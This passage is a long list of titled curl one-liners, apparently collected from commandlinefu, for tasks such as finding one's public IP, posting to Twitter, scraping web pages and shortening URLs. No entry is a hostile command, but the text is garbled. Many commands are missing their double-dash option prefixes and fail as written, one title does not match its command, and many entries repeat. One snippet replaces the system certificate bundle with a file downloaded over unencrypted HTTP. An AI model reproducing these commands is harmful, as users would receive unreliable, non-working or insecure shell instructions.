curl -s "http://ajax.googleapis.com/ajax/services/language/translate?langpair=|en&v=1.0&q=`xsel`" |cut -d \" -f 6
```

### OpenDns IP update via curl
```sh
curl -i -m 60 -k -u user:password 'https://updates.opendns.com/account/ddns.php?'
```

### Twitter update from terminal    (pok3's snipts ?)
```sh
curl -u YourUsername:YourPassword -d status="Your status message go here" http://twitter.com/statuses/update.xml
```

### posts an xml file to a webservice with curl
```sh
curl -X POST -d @request.xml -H 'Content-Type: text/xml' https://hostname/context/service
```

### Get My Public IP Address
```sh
curl -s http://whatismyip.org/
```

### Get your outgoing IP address
```sh
curl -s httpbin.org/ip | jq -r .origin
```

### Displays the current time using HTTP
```sh
curl -Is google.com | grep Date
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | jshon -e world -e population -u
```

### Random quote from Borat
```sh
curl -s http://smacie.com/randomizer/borat.html | sed -nE "s# *<td valign=\"top\"><big><big><big><font face=\"Comic Sans MS\">(.*)</font></big></big></big></td>#\1#p"
```

### Scrape commands from commandline fu's 1st page
```sh
curl -s http://www.commandlinefu.com/commands/browse|egrep '("Fin.*and"|<div class="command">.*</div>)'|sed 's/<[^<]*>//g'|ruby -rubygems -pe 'require "cgi"; $_=sprintf("\n\n%-100s\n\t#%-20s",CGI.unescapeHTML($_).chomp.strip, gets.lstrip) if $.%2'
```

### Get DELL Warranty Information from support.dell.com
```sh
curl -sL http://www.dell.com/support/troubleshooting/us/en/555/Servicetag/$(dmidecode -s system-serial-number) | html2text -style pretty | awk -F\. '/with an end date of/ { print $1 "."}'
```

### Get your outgoing IP address
```sh
curl ifconfig.me
```

### Get curenttly playing track in Last.fm radio
```sh
curl -s http://ws.audioscrobbler.com/1.0/user/<user_id>/recenttracks.rss|grep '<title>'|sed -n '2s/ *<\/\?title>//gp'
```

### List the popular module namespaces on CPAN
```sh
curl http://www.cpan.org/modules/01modules.index.html |awk '{print $1}'|grep -v "<"|sort|uniq -c|grep -v " +[0-9] "
```

### Get your public ip using dyndns
```sh
curl -s http://checkip.dyndns.org/ | grep -o "[[:digit:].]\+"
```

### Look up the definition of a word
```sh
curl dict://dict.org/d:something
```

### Gets the english pronunciation of a phrase
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=hello+world" > hello.mp3
```

### Translates a phrase from English to Portuguese
```sh
curl -s -A "Mozilla" "http://translate.google.com.br/translate_a/t?client=t&text=Hi+world&hl=pt-BR&sl=en&tl=pt&multires=1&ssel=0&tsel=0&sc=1" | awk -F'"' '{print $2}'
```

### Get your external IP address
```sh
curl ifconfig.me/all/json
```

### Use curl to save an MP3 stream
```sh
curl -sS -o $outfile -m $showlengthinseconds $streamurl
```

### Follow a new friend on twitter
```sh
curl -u USERNAME:PASSWORD -d "" http://twitter.com/friendships/create/NAMEOFNEWFRIEND.xml?follow=true
```

### Get your external IP address ( 10 characters long )
```sh
curl ip.nu
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Tweet from Terminal to twitter !
```sh
curl -u yourusername:yourpassword -d status=?Your Message Here? https://twitter.com/statuses/update.xml
```

### Find artist and title of a music cd, UPC code given (first result only)
```sh
curl -s 'http://www.discogs.com/search?q=724349691704' | sed -n '\#/release/#{s/^<div>.*>\(.*\)<\/a><\/div>/\1/p}'
```

### Find a CommandlineFu users average command rating
```sh
curl -s www.commandlinefu.com/commands/by/PhillipNordwall | awk -F\> '/num-votes/{S+=$2; I++}END{print S/I}'
```

### Get a file from SharePoint with cURL
```sh
curl ntlm -u DOMAIN/user https://sharepoint.domain.com/path/to/file
```

### Fixes Centos 6.2 yum's metalink certificate errors
```sh
curl http://curl.haxx.se/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt
```

### Get a facebook likes quantity from CLI
```sh
curl - https://graph.facebook.com/fql?q=SELECT%20like_count,%20total_count,%20share_count,%20click_count,%20comment_count%20FROM%20link_stat%20WHERE%20url%20=%20%27<URL>%27 | awk -F\" '{ print $7 }' | awk -F":" '{ print $2 }' | awk -F"," '{ print $1 }'
```

### Grab the top 5 CLFUContest one-liners
```sh
curl -sL http://goo.gl/3sA3iW | head -16 | tail -14
```

### Update twitter via curl (and also set the "from" bit)
```sh
curl -u twitter-username -d status="Hello World, Twitter!" -d source="cURL" http://twitter.com/statuses/update.xml
```

### Download all Delicious bookmarks
```sh
curl -u username -o bookmarks.xml https://api.del.icio.us/v1/posts/all
```

### a function to find the fastest DNS server
```sh
curl -s http://public-dns.info/nameserver/br.csv| cut -d, -f1 | xargs -i timeout 1 ping -c1 -w 1 {} | grep time | sed -u "s/.* from \([^:]*\).*time=\([^ ]*\).*/\2\t\1/g" | sort -n | head -n1
```

### Get your external IP address if your machine has a DNS entry
```sh
curl www.whatismyip.com/automation/n09230945.asp
```

### Check if the LHC has destroyed the world
```sh
curl -s http://www.hasthelhcdestroyedtheearth.com/ | sed -En '/span/s/.*>(.*)<.*/\1/p'
```

### backup delicious bookmarks
```sh
curl user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us/v1/posts/all'
```

### Use Dell Service Tag $1 to Find Machine Model [Model Name and Model Number]
```sh
curl -s $dellurl$1 | tr "\"" "\n" | grep "</td></tr><tr><td class=" -m 2 | grep -v "Service Tag" | sed 's/>//g' | sed 's/<\/td<\/tr<tr<td class=//g'
```

### Random Futurama quote
```sh
curl -s "http://subfusion.net/cgi-bin/quote.pl?quote=futurama&number=1" |awk '/<body><br><br><b><hr><br>/ {flag=1;next} /<br><br><hr><br>/{flag=0} flag {print}'
```

### Get all files of particular type (say, PDF) listed on some wegpage (say, example.com)
```sh
curl -s http://example.com | grep -o -P "<a.*href.*>" | grep -o "http.*.pdf" |  xargs -d"\n" -n1  wget -c
```

### Download all Red Hat Manuals - A better way by user Flatcap
```sh
curl -s https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/ | grep -o '[^"]*Linux/7/pdf[^"]*' | xargs -I{} wget https://access.redhat.com{}
```

### Oneliner to get domain names list of all existing domain names (from wikipedia)
```sh
curl -s http://en.m.wikipedia.org/wiki/List_of_Internet_top-level_domains | sed -n '/<tr valign="top">/{s/<[^>]*>//g;p}'
```

### Get ElasticSearch configuration and version details
```sh
curl -XGET 'localhost:9200'
```

### Creating shortened URLs from the command line
```sh
curl -s http://tinyurl.com/create.php?url=http://<website.url>/ | sed -n 's/.*\(http:\/\/tinyurl.com\/[a-z0-9][a-z0-9]*\).*/\1/p' | uniq
```

### A command to post a message and an auto-shortened link to Twitter. The link shortening service is provide by TinyURL.
```sh
curl user "USERNAME:PASSWORD" -d status="MESSAGE_GOES_HERE $(curl -s http://tinyurl.com/api-create.php?url=URL_GOES_HERE)" -d source="cURL" http://twitter.com/statuses/update.json -o /dev/null
```

### shorten url using curl, sed and is.gd
```sh
curl -s -d URL="$1" http://is.gd/create.php | sed '/Your new shortened/!d;s/.*value="\([^"]*\)".*/\1/'
```

### random xkcd comic as xml
```sh
curl -sL 'dynamic.xkcd.com/comic/random/' | awk -F\" '/^<img/{printf("<?xml version=\"1.0\"?>\n<xkcd>\n<item>\n <title>%s</title>\n <comment>%s</comment>\n <image>%s</image>\n</item>\n</xkcd>\n", $6, $4, $2)}'
```

### Find out how old a web page is
```sh
curl -Is http://osswin.sourceforge.net/ | grep Mod
```

### Get your public ip
```sh
curl -s http://sputnick-area.net/ip
```

### List NYC startups that are hiring
```sh
curl -s -L http://nytm.org/made-in-nyc | grep "(hiring)" | sed -re 's/<([^>]+)>//g;s/^([ \t]*)//g'
```

### Bitcoin prices from the command line
```sh
curl btc.cm/last
```

### Download all files from podcast RSS feed
```sh
curl http://url/rss | grep -o '<enclosure url="[^"]*' | grep -o '[^"]*$' | xargs wget -c
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Retrieve "last modified" timestamp of web resource in UTC seconds
```sh
curl silent head "${url}" | grep 'Last-Modified:' | cut -c 16- | date -f - +'%s'
```

### The wisdom of Cave Johnson
```sh
curl -s http://www.cavejohnsonhere.com/random/ | grep quote_main | cut -d \> -f 2- | fmt -w $(tput cols)
```

### Download all images from a 4chan thread
```sh
curl -s $1 | grep -o -i '<a href="//images.4chan.org/[^>]*>' | sed -r 's%.*"//([^"]*)".*%\1%' | xargs wget
```

### Get My Public IP Address
```sh
curl -s http://myip.dk/ | egrep -m1 -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
```

### Send email with curl and gmail
```sh
curl -n ssl-reqd mail-from "<user@gmail.com>" mail-rcpt "<user@server.tld>" url smtps://smtp.gmail.com:465 -T file.txt
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### Get HTTP status code with curl AND print response on new line
```sh
curl -s -o /dev/null -w "%{http_code}\n" localhost
```

### List of countries
```sh
curl -s http://www.infoplease.com/countries.html | grep "<td"  | grep ipa  | sed -e 's#html">#\n#g'  | cut -f 1 -d\<  | grep -v "^\ \ *$"
```

### Automagically create a /etc/hosts file based on your DHCP list (only works on Linksys WRT54G router)
```sh
curl -s -u $username:$password http://192.168.1.1/DHCPTable.htm | grep '<td>.* </td>' | sed 's|\t<td>\(.*\) </td>\r|\1|' | tr '\n' ';' | sed 's/\([^;]*\);\([^;]*\);/\2\t\1\n/g'
```

### List your Boxee queue
```sh
curl -u <username> http://app.boxee.tv/api/get_queue | xml2 | grep /boxeefeed/message/description | awk -F= '{print $2}'
```

### return external ip
```sh
curl inet-ip.info
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -sI http://slashdot.org/ | sed -nr 's/X-(Bender|Fry)(.*)/\1\2/p'
```

### download all jpg in webpage
```sh
curl -sm1 http://www.website.com/ | grep -o 'http://[^"]*jpg' | sort -u | wget -qT1 -i-
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### git clone all user repos
```sh
curl -s https://api.github.com/users/tuxcanfly/repos | jq -r  'map(select(.fork == false)) | map(.url) | map(sub("https://api.github.com/repos/"; "git clone git@github.com:")) | @sh' | xargs -n1 sh -c]
```

### Check remote hosts server
```sh
curl -Is http://www.google.com | grep -E '^Server'
```

### Get Stuff.
```sh
curl "http://www.commandlinefu.com/commands/matching/$(echo "$@" | sed 's/ /-/g')/$(echo -n $@ | base64)/plaintext"
```

### lookup a short url with curl
```sh
curl -I -L http://t.co/mQUxL6yS
```

### Another Curl your IP command
```sh
curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | python -c 'import json,sys;obj=json.load(sys.stdin);print obj["world"]["population"]'
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -Is slashdot.org | sed -ne '/^X-[FBL]/s/^X-//p'
```

### Fetches a Reddit user's ($USER) link karma
```sh
curl -s http://www.reddit.com/user/$USER/about.json | tr "," "\n" | grep "link_karma" | tr ": " "\n" | grep -E "[0-9]+" | sed s/"^"/"Link Karma: "/
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Send an http HEAD request w/curl
```sh
curl -I http://localhost
```

### Get My Public IP Address
```sh
curl ifconfig.me
```

### show WAN IP
```sh
curl ifconfig.me
```

### JSON processing with Python
```sh
curl -s "http://feeds.delicious.com/v2/json?count=5" | python -m json.tool | less -R
```

### Update twitter via curl
```sh
curl -u user -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Upload an image to Twitpic
```sh
curl -F "username=mytwiterlogin" -F "password=mytwitterpassword" -F "message=My image description" -F media=@"./image.png" http://twitpic.com/api/uploadAndPost
```

### Gets the english pronunciation of a phrase
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=hello+world" | play -t mp3 -
```

### Download a TiVo Show
```sh
curl -s -c /tmp/cookie -k -u tivo:$MAK digest "$(curl -s -c /tmp/cookie -k -u tivo:$MAK digest https://$tivo/nowplaying/index.html | sed 's;.*<a href="\([^"]*\)">Download MPEG-PS</a>.*;\1;' | sed 's|\&amp;|\&|')" | tivodecode -m $MAK  - > tivo.mpg
```

### Play 2600 off the hook over ssh
```sh
curl -L -s `curl -s http://www.2600.com/oth-broadband.xml` | xmlstarlet sel -t -m "//enclosure[1]" -v "@url" -n | head -n 1` | ssh -t [user]@[host] "mpg123 -"
```

### Play a podcast via XPath and mpg123
```sh
curl -L -s `curl -s [http://podcast.com/show.rss]` | xmlstarlet sel -t -m "//enclosure[1]" -v "@url" -n | head -n 1` | ssh -t [user]@[host] "mpg123 -"
```

### get WAN / external IP
```sh
curl tnx.nl/ip
```

### Get magnet link from URL
```sh
curl -s http://host.net/url.html | grep magnet | sed -r 's/.*(magnet:[^"]*).*/\1/g'
```

### Check your unread Gmail from the command line
```sh
curl -u username:password silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
```

### Command Line to Get the Stock Quote via Yahoo
```sh
curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'
```

### upload a file via ftp
```sh
curl -u user:passwd -T /home/dir/local_file_to_upload ftp://your_host.com/subdir/
```

### Spelling Suggestion
```sh
curl -s "http://search.yahooapis.com/WebSearchService/V1/spellingSuggestion?appid=YahooDemo&query=mozmbque"|sed -n -e 's/.*<Result>\(.*\)<\/Result>.*/\1/p'
```

### External IP (raw data)
```sh
curl ifconfig.me
```

### Download all files from a Gist without Git
```sh
curl -L https://gist.github.com/westonruter/ea038141e46e017d280b/download | tar -xvz strip-components=1
```

### Find artist and title of a music cd, UPC code given (first result only)
```sh
curl http://www.discogs.com/search?q=724349691704 2> /dev/null | grep \/release\/ | head -2 | tail -1 | sed -e 's/^<div>.*>\(.*\)<\/a><\/div>/\1/'
```

### Get your public ip
```sh
curl -s http://icanhazip.com/
```

### Get the amount of users currently registered at the DudaLibre.com Linux Counter.
```sh
curl silent http://www.dudalibre.com/gnulinuxcounter?lang=en | grep users | head -2 | tail -1 | sed 's/.*<strong>//g' | sed 's/<\/strong>.*//g'
```

### Send a message to Kodi (XBMC)
```sh
curl -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"GUI.ShowNotification","params":{"title":"This is the title of the message","message":"This is the body of the message"},"id":1}' http://i3c.pla.lcl:8080/jsonrpc
```

### Make a HTTP request using curl with POST method
```sh
curl verbose -d "hello=world" http://mydomain.com
```

### get the current weather in NYC, in human readable form
```sh
curl -s poncho.is/forecast/new_york/today/ | grep -E 'og:title|og:description' | cut -d\" -f4 | awk '{print $0,"<p>"}' | lynx -stdin -dump
```

### copy remote ssh session output to local clipboard
```sh
curl "https://coinurl.com/api.php?uuid=5378..........5&url=http://www.commandlinefu.com"
```

### Get number of diggs for a news URL
```sh
curl -s "http://services.digg.com/stories?link=$NEWSURL&appkey=http://www.whatever.com&type=json"  | python -m simplejson.tool | grep diggs
```

### Backup your precious Tomato Router Stats
```sh
curl http://root:PASSWORD@ROUTER_DYN_DNS/bwm/tomato_rstatsa001839ceb1d4.gz?_http_id=HTTPID > $HOME/Dropbox/Backups/tomato_stats.gz
```

### Get URL's from a webpage
```sh
curl url | egrep -o '(http|https)://[a-z0-9]*\.[a-z0-9]*\.[a-z0-9]*'|sort |uniq
```

### Get HTTP headers using curl, but still perform a GET
```sh
curl -sSi <URL> | sed '/^\r$/q'
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### moreplayingaround
```sh
curl -s -u username:passwd http://twitter.com/statuses/friends_timeline.rss|grep title|sed -ne 's/<\/*title>//gp' |festival tts
```

### Download all images from a 4chan thread
```sh
curl -s http://boards.4chan.org/wg/|sed -r 's/.*href="([^"]*).*/\1\n/g'|grep images|xargs wget
```

### Dump filtered twitter stream to a file
```sh
curl -s -u $USERNAME -X POST -d "track=obama,barack" https://stream.twitter.com/1.1/statuses/filter.json -o twitter-stream.out
```

### Get your external IP address
```sh
curl l2.io/ip
```

### Shorten url using bit.ly API
```sh
curl -s data-urlencode 'longUrl='$1 data-urlencode 'login='$login data-urlencode 'apiKey='$apikey 'http://api.bit.ly/shorten?version=2.0.1&format=xml' | xmlstarlet sel -T -t -m "//shortUrl" -v "." | line
```

### Basic monitor for a website or API looking at HTTP response codes
```sh
curl write-out %{http_code} connect-timeout 10 max-time 20 -s -I -L http://google.com output /dev/null
```

### Print the lastest stable version of Perl
```sh
curl -s http://www.perl.org/get.html | grep -m1 '\.tar\.gz' | sed 's/.*perl-//; s/\.tar\.gz.*//'
```

### View the newest xkcd comic.
```sh
curl -s 'xkcd.com' | awk -F\" '/^<img/{printf("<?xml version=\"1.0\"?>\n<xkcd>\n<item>\n <title>%s</title>\n <comment>%s</comment>\n <image>%s</image>\n</item>\n</xkcd>\n", $6, $4, $2)}'
```

### geoip information
```sh
curl -s "http://www.geody.com/geoip.php?ip=$(curl -s icanhazip.com)" | sed '/^IP:/!d;s/<[^>][^>]*>//g'
```

### What is my ip?
```sh
curl http://www.whatismyip.org/
```

### back up your commandlinefu contributed commands
```sh
curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->commandlinefu-contribs-backup-$(date +%Y-%m-%d-%H.%M.%S).rss.gz
```

### What is my ip?
```sh
curl -s mi-ip.net | grep '"ip"' | cut -f2 -d ">" | egrep -o '[0-9.]+'
```

### Retrieve the final URL after redirect
```sh
curl $URL -s -L -o /dev/null -w '%{url_effective}'
```

### get daily wizard of id comic
```sh
curl -o id.gif `date +http://d.yimg.com/a/p/uc/%Y%m%d/largeimagecrwiz%y%m%d.gif`
```

### Get current stable kernel version string from kernel.org
```sh
curl -s kernel.org | grep '<strong>' | head -3 | tail -1 | cut -d'>' -f3 | cut -d'<' -f1
```

### extract XML RSS etc by tags such as <title> or <code> or <description>
```sh
curl ${URL} 2>/dev/null|grep "<${BLOCK}>"|sed -e "s/.*\<${BLOCK}\>\(.*\)\<\/${BLOCK}\>.*/\1/g"
```

### Get the state (HTTP code) of a resource from its URL
```sh
curl -s -L head -w "%{http_code}\n" URL | tail -n1
```

### display the hover text of the most recent xkcd
```sh
curl -s 'http://xkcd.com/rss.xml' | xpath '//item[1]/description/text()' 2>&1 | sed -n 's/.*title="\([^"]*\)".*/\1/p' | fold -s
```

### Output the latest linux kernel versions from kernel.org
```sh
curl 'https://www.kernel.org/kdist/finger_banner'
```

### Check if the LHC has destroyed the world
```sh
curl -q -s http://www.hasthelhcdestroyedtheearth.com/ | sed -En '/span/s/.*>(.*)<.*/\1/p'
```

### Display current temperature anywhere in the world in Farenheit
```sh
curl -s 'http://www.google.com/ig/api?weather=santa+monica,ca'| sed -ne "s/.*temp_f data..//;s/....temp_c data.*//;p" | figlet
```

### Send an http HEAD request w/curl
```sh
curl -i -X HEAD http://localhost/
```

### Clone all github repos of a user
```sh
curl -s "https://api.github.com/users/${USERNAME}/repos" | ruby -rubygems -e 'require "json"; JSON.load(STDIN.read).each {|repo| %x[git clone #{repo["ssh_url"]} ]}'
```

### backup and synchronize entire remote folder locally (curlftpfs and rsync over FTP using FUSE FS)
```sh
curlftpfs ftp://YourUsername:YourPassword@YourFTPServerURL /tmp/remote-website/ && rsync -av /tmp/remote-website/* /usr/local/data_latest && umount /tmp/remote-website
```

### Search commandlinefu from the CLI
```sh
curl -sd q=Network http://www.commandlinefu.com/search/autocomplete |html2text -width 100
```

### Find your Amazon EC2 instance type
```sh
curl -s http://169.254.169.254/latest/meta-data/instance-type
```

### What is my public IP address
```sh
curl -s checkip.dyndns.org|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
```

### Send youtube video to Kodi
```sh
curl -i -X POST -d '{"jsonrpc": "2.0", "method": "Player.Open", "params": {"item": { "file" : "plugin://plugin.video.youtube/play/?video_id=YOUTUBEID"}}, "id": 1}' http://username:password@kodi/jsonrpc -H "Content-Type: application/json"
```

### Shorten url with is.gd using curl, perl
```sh
curl -s "http://is.gd/api.php?longurl=[long_url]"
```

### Get own public IP address
```sh
curl -s http://wtfismyip.com/text
```

### Get IP address from Tor exit-node
```sh
curl -s -d "CSField=Name" -d "CSInput=BostonUCompSci" http://torstatus.blutmagie.de/index.php | grep -oP "ip=\K(\d+)(\.\d+){3}"
```

### Download all files from a Github gist individually
```sh
curl -sS remote-name-all $(curl -sS https://api.github.com/gists/997ccc3690ccd3ac5196211aff59d989 | jq -r '.files[].raw_url')
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl -s 'http://checkip.dyndns.org' | sed 's/.*Current IP Address: \([0-9\.]*\).*/\1/g'
```

### commit message generator - whatthecommit.com
```sh
curl -s 'http://whatthecommit.com/' | grep '<p>' | cut -c4-
```

### check details of calling a url
```sh
curl -iv url
```

### Submit data to a HTML form with POST method and save the response
```sh
curl -sd 'rid=value&submit=SUBMIT' <URL> > out.html
```

### Save the Top 2500 commands from commandlinefu to a single text file
```sh
curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] | grep -v _curl_ > comfu.txt
```

### Amazing real time picture of the sun in your wallpaper
```sh
curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -onroot -fill stdin
```
